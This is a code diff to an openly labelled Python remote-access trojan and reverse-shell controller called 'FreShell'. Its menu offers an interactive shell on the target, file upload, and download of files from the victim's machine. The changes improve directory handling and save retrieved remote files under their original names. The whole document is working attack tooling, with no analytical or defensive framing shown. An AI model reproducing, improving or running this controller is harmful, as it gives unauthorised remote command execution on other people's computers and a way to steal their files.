@@ -19,7 +19,7 @@ def accept():
     conn, addr = s.accept()
 
 def banner():
-    print "\n[+] Freshnut's FreShell, a simple python reverse shell. [+]\n"
+    print "\n[+] Freshnut's FreShell, a simple Python RAT. [+]\n"
     print """
 ==============================================================================
 @@@@@@@@  @@@@@@@   @@@@@@@@   @@@@@@   @@@  @@@  @@@@@@@@  @@@       @@@       
@@ -46,7 +46,7 @@ Options:
 
   1               Interactive Shell
                   Type "quit" to return to menu from Interactive Shell
-  2               Upload File
+  2               Upload File to Current Working Directory
   3               Download File
   4               Target IP & Port
   quit            Quit
@@ -90,10 +90,14 @@ def command():
     while True:
         # sys.stdout.write(cwd)
         cmd = raw_input("#> ")
+        split = cmd.split(" ")
+        cd = split[0]
+        path = split[-1]
         conn.send(cmd)
         if cmd == "quit":
-            print " [-] Disconnected"
             menu()
+        elif cd == "cd":
+            continue
         else:
             data = conn.recv(4096)
             sys.stdout.write(data)
@@ -107,19 +111,21 @@ def snd_file():
     snd_f = open(input_f, "rb")
     read = snd_f.read()
     conn.send(read)
-    print "[+] File Sent"
     snd_f.close()
+    print "[+] File Sent"
 
 
 # Download File
 def rcv_file():
-    loc_f = raw_input("Target full file path: ")
-    rcv_f = open("newfile", "wb+")
-    data_f = conn.recv(4096)
+    loc_f = raw_input("Remote file path: ")
+    split = loc_f.split("/")
+    filename = split[-1]
+    conn.send(loc_f)
+    data_f = conn.recv(10000)
+    rcv_f = open(filename, "wb+")
     rcv_f.write(data_f)
     rcv_f.close()
     print "[+] File retrieved"
-    sys.stdout.write(data_f)
 
 
 def main():
